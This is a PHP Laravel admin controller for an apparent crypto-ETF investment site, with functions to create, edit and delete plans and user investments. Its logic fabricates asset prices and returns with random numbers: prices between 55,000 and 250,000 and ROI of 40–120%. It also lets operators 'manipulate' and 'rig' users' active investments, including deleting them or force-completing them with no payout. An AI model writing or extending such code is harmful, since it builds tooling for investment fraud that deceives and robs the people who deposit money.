<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\Investment_history;
use App\Models\Package;
use App\Services\EtfLogoService;
use Illuminate\Http\Request;
use Illuminate\Support\Carbon;

class CryptoETFController extends Controller
{
    /**
     * Display the Crypto ETFs management page
     */
    public function index()
    {
        // Crypto ETF Plans
        $plans = Package::where('type', 'etf')->orderBy('id', 'asc')->get();

        // Active User Investments for Crypto ETFs
        $investments = Investment_history::with(['user', 'package'])
            ->whereHas('package', function ($q) {
                $q->where('type', 'etf');
            })
            ->latest()
            ->paginate(20);

        return view('admin.crypto_etfs', compact('plans', 'investments'));
    }

    /**
     * Update an ETF Plan's global parameters
     */
    public function updatePlan(Request $request)
    {
        $plan = Package::where('type', 'etf')->findOrFail($request->id);

        $plan->name = $request->name ?? $plan->name;
        $plan->amount = $request->amount ?? $plan->amount; // min investment
        $plan->min_deposit = $request->min_deposit ?? $plan->min_deposit;
        $plan->perc = $request->perc ?? $plan->perc; // return rate %
        $plan->day = $request->day ?? $plan->day; // duration

        if ($request->has('ticker')) {
            $plan->ticker = $request->ticker;
            // Clear logo_url to force re-fetch if ticker changed, unless logo_url was explicitly provided
            if (! $request->has('logo_url')) {
                $plan->logo_url = EtfLogoService::getLogoUrl($request->ticker);
            }
        }
        if ($request->has('logo_url')) {
            $plan->logo_url = $request->logo_url;
        }

        $plan->save();

        return response()->json(['status' => 'ETF Plan updated successfully.']);
    }

    /**
     * Create a new ETF Plan
     */
    public function storePlan(Request $request)
    {
        $request->validate([
            'name' => 'required|string|max:255',
            'amount' => 'required|numeric|min:0',
            'min_deposit' => 'nullable|numeric|min:0',
            'perc' => 'required|numeric|min:0',
            'day' => 'required|integer|min:1',
            'ticker' => 'nullable|string|max:20',
            'logo_url' => 'nullable|string|max:500',
        ]);

        $logo_url = $request->logo_url;
        if (! $logo_url && $request->ticker) {
            $logo_url = EtfLogoService::getLogoUrl($request->ticker);
        }

        Package::create([
            'type' => 'etf',
            'name' => $request->name,
            'ticker' => $request->ticker,
            'logo_url' => $logo_url,
            'amount' => $request->amount,
            'min_deposit' => $request->min_deposit ?? 0,
            'perc' => $request->perc,
            'day' => $request->day,
        ]);

        return back()->with('status', 'ETF Plan created successfully.');
    }

    /**
     * Delete an ETF Plan
     */
    public function deletePlan($id)
    {
        $plan = Package::where('type', 'etf')->findOrFail($id);
        $plan->delete(); // Soft delete

        return back()->with('status', 'ETF Plan deleted successfully.');
    }

    /**
     * Manipulate a user's active ETF investment (ROI, Duration, Status)
     */
    public function updateInvestment(Request $request)
    {
        $investment = Investment_history::whereHas('package', function ($q) {
            $q->where('type', 'etf');
        })->findOrFail($request->id);

        if ($request->action == 'delete') {
            $investment->delete();

            return response()->json(['status' => 'ETF investment record deleted.']);
        }

        if ($request->action == 'pause') {
            $investment->status = 'paused';
            $investment->save();

            return response()->json(['status' => 'ETF investment paused.']);
        }

        if ($request->action == 'resume') {
            $investment->status = 'active';
            $investment->save();

            return response()->json(['status' => 'ETF investment resumed.']);
        }

        if ($request->action == 'force_complete') {
            $investment->status = 'completed';
            $investment->end_date = now();
            // Optionally, calculate final payout and credit user balance here
            $investment->save();

            return response()->json(['status' => 'ETF investment forcefully marked as completed.']);
        }

        if ($request->action == 'edit') {
            if ($request->has('perc')) {
                $investment->perc = $request->perc;
            }
            if ($request->has('day')) {
                $investment->day = $request->day;
                // Recalculate end date based on new duration
                $start_date = Carbon::parse($investment->start_date);
                $investment->end_date = $start_date->addDays($request->day)->format('Y-m-d H:i:s');
            }
            $investment->save();

            return response()->json(['status' => 'ETF investment rigged successfully.']);
        }

        return response()->json(['error' => 'Invalid action.'], 400);
    }

    /**
     * Auto-populate known crypto ETFs
     */
    public function autoPopulate()
    {
        $etfs = EtfLogoService::getKnownCryptoETFs();
        $count = 0;

        foreach ($etfs as $etfData) {
            $exists = Package::where('type', 'etf')
                ->where(function ($q) use ($etfData) {
                    $q->where('ticker', $etfData['ticker'])
                        ->orWhere('name', 'like', '%'.$etfData['ticker'].'%');
                })->exists();

            if (! $exists) {
                $marketPrice = rand(55000, 250000);

                Package::create([
                    'type' => 'etf',
                    'name' => $etfData['name'],
                    'ticker' => $etfData['ticker'],
                    'logo_url' => $etfData['logo_url'],
                    'amount' => $marketPrice,
                    'min_deposit' => $marketPrice,
                    'perc' => rand(40, 120), // Randomized ROI between 40% and 120%
                    'day' => rand(30, 1825), // Randomized duration between 30 days and 5 years
                ]);
                $count++;
            }
        }

        return back()->with('status', "Auto-populated {$count} new Crypto ETF plans.");
    }

    /**
     * Refresh all logos for existing ETFs based on their ticker.
     */
    public function refreshLogos()
    {
        $plans = Package::where('type', 'etf')->get();
        $updated = 0;

        foreach ($plans as $plan) {
            // If the name has something like (IBIT), we can try to extract ticker
            if (! $plan->ticker) {
                if (preg_match('/\(([A-Z]{3,5})\)/', $plan->name, $matches)) {
                    $plan->ticker = $matches[1];
                } else {
                    // Try to guess from first word if it looks like a ticker
                    $words = explode(' ', $plan->name);
                    if (ctype_upper($words[0]) && strlen($words[0]) <= 5) {
                        $plan->ticker = $words[0];
                    }
                }
            }

            if ($plan->ticker) {
                $plan->logo_url = EtfLogoService::getLogoUrl($plan->ticker, $plan->name);

                $marketPrice = rand(55000, 250000);
                if ($marketPrice) {
                    $plan->amount = $marketPrice;
                    $plan->min_deposit = $marketPrice;
                }

                $plan->save();
                $updated++;
            }
        }

        return back()->with('status', "Refreshed logos for {$updated} ETF plans.");
    }
}
